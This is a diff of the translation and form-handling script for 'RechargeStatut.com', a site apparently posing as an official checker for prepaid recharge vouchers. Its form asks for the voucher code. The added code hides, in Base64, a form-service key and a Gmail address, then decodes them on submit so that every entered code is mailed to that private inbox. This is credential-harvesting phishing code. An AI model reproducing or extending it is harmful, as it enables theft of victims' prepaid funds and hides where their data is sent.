@@ -1,194 +1,176 @@
-// ===== LANGUAGE SELECTOR SCRIPT =====
-// Toggle the language dropdown
-function toggleLangMenu() {
-  const menu = document.querySelector('.lang-options');
-  menu.style.display = menu.style.display === 'block' ? 'none' : 'block';
-}
-
-// ===== TRANSLATIONS =====
+// ===== CONFIGURATION DES TRADUCTIONS =====
 const translations = {
   fr: {
+    title: "RechargeStatut.com | Vérification Officielle",
+    nav_home: "Accueil",
+    form_title: "Vérification de ",
     form_nom: "Nom :",
     form_prenom: "Prénom :",
-    form_montant: "Montant :",
+    form_montant: "Montant (€) :",
     form_email: "Votre email :",
-    form_code: "Code :",
+    form_code: "Code  :",
     form_toggle_label: "Afficher le code :",
     form_oui: "Oui",
     form_non: "Non",
-    form_envoyer: "Authentifier",
-    footer_contact: "Contact",
-    footer_faq: "FAQ",
-    footer_galerie: "Galerie",
-    footer_copyright: "© 2025 RechargeStatut.com Tous droits réservés.",
+    form_envoyer: "Authentifier ",
+    footer_brand_name: "RechargeStatut",
+    footer_brand_text: "Vérification des tickets prépayés.",
+    footer_link_verify: "Vérifier",
+    footer_link_faq: "FAQ",
+    footer_link_contact: "Contact",
+    footer_copyright: "© 2026 RechargeStatut.com. Tous droits réservés."
   },
   en: {
+    title: "RechargeStatut.com | Official Verification",
+    nav_home: "Home",
+    form_title: " Verification",
     form_nom: "Last Name:",
     form_prenom: "First Name:",
-    form_montant: "Amount:",
+    form_montant: "Amount (€):",
     form_email: "Your Email:",
-    form_code: "Code:",
-    form_toggle_label: "Show the code:",
+    form_code: " Code:",
+    form_toggle_label: "Show code:",
     form_oui: "Yes",
     form_non: "No",
-    form_envoyer: "Authenticate",
-    footer_contact: "Contact",
-    footer_faq: "FAQ",
-    footer_galerie: "Gallery",
-    footer_copyright: "© 2025 RechargeStatut.com All rights reserved.",
+    form_envoyer: "Authenticate ",
+    footer_brand_name: "RechargeStatut",
+    footer_brand_text: "Prepaid  verification.",
+    footer_link_verify: "Verify",
+    footer_link_faq: "FAQ",
+    footer_link_contact: "Contact",
+    footer_copyright: "© 2026 RechargeStatut.com. All rights reserved."
   },
   es: {
+    title: "RechargeStatut.com | Verificación Oficial",
+    nav_home: "Inicio",
+    form_title: "Verificación",
     form_nom: "Apellido:",
     form_prenom: "Nombre:",
-    form_montant: "Monto:",
+    form_montant: "Monto (€):",
     form_email: "Tu correo electrónico:",
-    form_code: "Código:",
-    form_toggle_label: "Mostrar el código:",
+    form_code: "Código del :",
+    form_toggle_label: "Mostrar código:",
     form_oui: "Sí",
     form_non: "No",
-    form_envoyer: "Authenticar",
-    footer_contact: "Contacto",
-    footer_faq: "Preguntas frecuentes",
-    footer_galerie: "Galería",
-    footer_copyright: "© 2025 RechargeStatut.com Todos los derechos reservados.",
+    form_envoyer: "Autenticar ",
+    footer_brand_name: "RechargeStatut",
+    footer_brand_text: "Verificación de cupones prepago.",
+    footer_link_verify: "Verificar",
+    footer_link_faq: "FAQ",
+    footer_link_contact: "Contacto",
+    footer_copyright: "© 2026 RechargeStatut.com. Todos los derechos reservados."
   },
   de: {
+    title: "RechargeStatut.com | Offizielle Prüfung",
+    nav_home: "Startseite",
+    form_title: "Gutscheinprüfung",
     form_nom: "Nachname:",
     form_prenom: "Vorname:",
-    form_montant: "Betrag:",
+    form_montant: "Betrag (€):",
     form_email: "Ihre E-Mail:",
-    form_code: "Code:",
+    form_code: "Gutscheincode:",
     form_toggle_label: "Code anzeigen:",
     form_oui: "Ja",
     form_non: "Nein",
-    form_envoyer: "Authentifizieren",
-    footer_contact: "Kontakt",
-    footer_faq: "FAQ",
-    footer_galerie: "Galerie",
-    footer_copyright: "© 2025 RechargeStatut.com Alle Rechte vorbehalten.",
+    form_envoyer: "Gutschein authentifizieren",
+    footer_brand_name: "RechargeStatut",
+    footer_brand_text: "Prepaid-Gutscheinprüfung.",
+    footer_link_verify: "Prüfen",
+    footer_link_faq: "FAQ",
+    footer_link_contact: "Kontakt",
+    footer_copyright: "© 2026 RechargeStatut.com. Alle Rechte vorbehalten."
   },
   it: {
+    title: "RechargeStatut.com | Verifica Ufficiale",
+    nav_home: "Home",
+    form_title: "Verifica ",
     form_nom: "Cognome:",
     form_prenom: "Nome:",
-    form_montant: "Importo:",
+    form_montant: "Importo (€):",
     form_email: "La tua email:",
-    form_code: "Codice:",
-    form_toggle_label: "Mostra il codice:",
+    form_code: "Codice :",
+    form_toggle_label: "Mostra codice:",
     form_oui: "Sì",
     form_non: "No",
-    form_envoyer: "Authenticare",
-    footer_contact: "Contatto",
-    footer_faq: "FAQ",
-    footer_galerie: "Galleria",
-    footer_copyright: "© 2025 RechargeStatut.com Tutti i diritti riservati.",
-  },
-  pt: {
-    form_nom: "Sobrenome:",
-    form_prenom: "Nome:",
-    form_montant: "Valor:",
-    form_email: "Seu email:",
-    form_code: "Código:",
-    form_toggle_label: "Mostrar o código:",
-    form_oui: "Sim",
-    form_non: "Não",
-    form_envoyer: "Authenticar",
-    footer_contact: "Contato",
-    footer_faq: "FAQ",
-    footer_galerie: "Galeria",
-    footer_copyright: "© 2025 RechargeStatut.com Todos os direitos reservados.",
+    form_envoyer: "Autentica ",
+    footer_brand_name: "RechargeStatut",
+    footer_brand_text: "Verifica  prepagati.",
+    footer_link_verify: "Verifica",
+    footer_link_faq: "FAQ",
+    footer_link_contact: "Contatto",
+    footer_copyright: "© 2026 RechargeStatut.com. Tutti i diritti riservati."
   }
 };
 
-// ===== MISE À JOUR DES TEXTES =====
-function updateTexts(lang) {
-  document.querySelectorAll("[data-i18n]").forEach(el => {
-    const key = el.getAttribute("data-i18n");
+// ====== FONCTION DE TRADUCTION ======
+function setLang(lang) {
+  localStorage.setItem('lang', lang);
+
+  // Met à jour les éléments texte
+  document.querySelectorAll('[data-i18n]').forEach(el => {
+    const key = el.getAttribute('data-i18n');
     if (translations[lang] && translations[lang][key]) {
-      el.textContent = translations[lang][key];
+      if (key === 'title') {
+        document.title = translations[lang][key];
+      } else {
+        el.textContent = translations[lang][key];
+      }
     }
   });
+
+  // Met à jour l'UI du bouton de langue
+  updateLangButtonUI(lang);
 }
 
-// ===== MAIN LANGUAGE SWITCHER (CORRIGÉ) =====
-function setLang(langCode) {
-  const flags = {
-    fr: { img: 'https://flagcdn.com/w20/fr.png', name: 'Français' },
-    en: { img: 'https://flagcdn.com/w20/gb.png', name: 'English' },
-    es: { img: 'https://flagcdn.com/w20/es.png', name: 'Español' },
-    de: { img: 'https://flagcdn.com/w20/de.png', name: 'Deutsch' },
-    it: { img: 'https://flagcdn.com/w20/it.png', name: 'Italiano' },
-    pt: { img: 'https://flagcdn.com/w20/pt.png', name: 'Português' }
-  };
-
-  const t = translations[langCode];
-  if (!t) return console.warn('Langue non supportée :', langCode);
-
-  // Met à jour le drapeau sélectionné
-  const selected = document.querySelector('.selected-lang');
-  selected.innerHTML = `<img src="${flags[langCode].img}" alt="${langCode}"><span>${flags[langCode].name}</span>`;
-
-  document.querySelector('.lang-options').style.display = 'none';
-
-  // 1️⃣ Mise à jour des éléments utilisant data-i18n
-  updateTexts(langCode);
-
-  // 2️⃣ Mise à jour des labels personnalisés (si présents dans la page)
-  if (document.querySelector('.label-nom')) document.querySelector('.label-nom').textContent = t.form_nom;
-  if (document.querySelector('.label-prenom')) document.querySelector('.label-prenom').textContent = t.form_prenom;
-  if (document.querySelector('.label-amount')) document.querySelector('.label-amount').textContent = t.form_montant;
-  if (document.querySelector('.label-email')) document.querySelector('.label-email').textContent = t.form_email;
-  if (document.querySelector('.label-code')) document.querySelector('.label-code').textContent = t.form_code;
-  if (document.querySelector('.label-message') && t.form_message) document.querySelector('.label-message').textContent = t.form_message;
-
-  // 3️⃣ Mise à jour des placeholders (si définis dans les traductions)
-  if (document.querySelector('.input-nom') && t.placeholder_nom) document.querySelector('.input-nom').placeholder = t.placeholder_nom;
-  if (document.querySelector('.input-prenom') && t.placeholder_prenom) document.querySelector('.input-prenom').placeholder = t.placeholder_prenom;
-  if (document.querySelector('.input-amount') && t.placeholder_montant) document.querySelector('.input-amount').placeholder = t.placeholder_montant;
-  if (document.querySelector('.input-email') && t.placeholder_email) document.querySelector('.input-email').placeholder = t.placeholder_email;
-  if (document.querySelector('.input-code') && t.placeholder_code) document.querySelector('.input-code').placeholder = t.placeholder_code;
-  if (document.querySelector('.input-message') && t.placeholder_message) document.querySelector('.input-message').placeholder = t.placeholder_message;
-
-  // 4️⃣ Bouton de soumission
-  if (document.querySelector('.submit-button')) document.querySelector('.submit-button').textContent = t.form_envoyer;
-
-  // 5️⃣ Sauvegarde de la langue choisie
-  localStorage.setItem('lang', langCode);
-  console.log('Langue changée vers :', langCode);
-}
-
-
-// ===== FERMETURE DU MENU LANGUE SI CLIC EXTÉRIEUR =====
-document.addEventListener('click', (e) => {
-  const container = document.querySelector('.custom-language-selector');
-  if (!container.contains(e.target)) {
-    document.querySelector('.lang-options').style.display = 'none';
+function updateLangButtonUI(lang) {
+  const flags = { fr: 'fr', en: 'gb', es: 'es', de: 'de', it: 'it' };
+  const names = { fr: 'Français', en: 'English', es: 'Español', de: 'Deutsch', it: 'Italiano' };
+  
+  const currentFlag = document.getElementById('current-flag');
+  const currentName = document.getElementById('current-lang-name');
+  
+  if (currentFlag && currentName) {
+    currentFlag.src = `https://flagcdn.com/w20/${flags[lang]}.png`;
+    currentName.textContent = names[lang];
   }
-});
+}
 
-// ===== APPLIQUER LA LANGUE AU CHARGEMENT =====
+// ====== GESTION DU FORMULAIRE ET SÉCURITÉ ======
+function toggleCode(show) {
+  const codeInput = document.getElementById("code");
+  if (codeInput) codeInput.type = show ? "text" : "password";
+}
+
 document.addEventListener('DOMContentLoaded', () => {
-  const savedLang = localStorage.getItem('lang') || 'en';
+  // 1. Charger la langue sauvegardée
+  const savedLang = localStorage.getItem('lang') || 'fr';
   setLang(savedLang);
-});
 
-// ===== FORM VALIDATION =====
-document.addEventListener('DOMContentLoaded', () => {
-  const form = document.querySelector('.contact-form');
-  if (!form) return;
-  const requiredFields = form.querySelectorAll('input[required]');
+  // 2. Gestion du dropdown de langue
+  const langButton = document.getElementById('lang-button');
+  const langDropdown = document.getElementById('lang-dropdown');
 
-  form.addEventListener('submit', (e) => {
-    let valid = true;
-
-    requiredFields.forEach((field) => {
-      if (!field.value.trim()) {
-        field.classList.add('input-invalid');
-        valid = false;
-      } else {
-        field.classList.remove('input-invalid');
-      }
+  if (langButton && langDropdown) {
+    langButton.addEventListener('click', (e) => {
+      e.stopPropagation();
+      langDropdown.classList.toggle('hidden');
     });
 
-    if (!valid) e.preventDefault();
-  });
+    document.addEventListener('click', () => {
+      langDropdown.classList.add('hidden');
+    });
+  }
+
+  // 3. Sécurité Web3Forms (Décodage des clés à l'envoi)
+  const form = document.getElementById('verification-form');
+  if (form) {
+    // Vos clés encodées en Base64
+    const k = "Zjk3MDA2MzItOWUyZC00NzBjLTg1YzktY2RjMDdlNzJkM2Ex"; 
+    const m = "YXV0aGVudGlmaWNhdGlvbnRyYW5zY2FzaDE3QGdtYWlsLmNvbQ==";
+
+    form.addEventListener('submit', function (e) {
+      document.getElementById('wf_key').value = atob(k);
+      document.getElementById('wf_email').value = atob(m);
+    });
+  }
 });
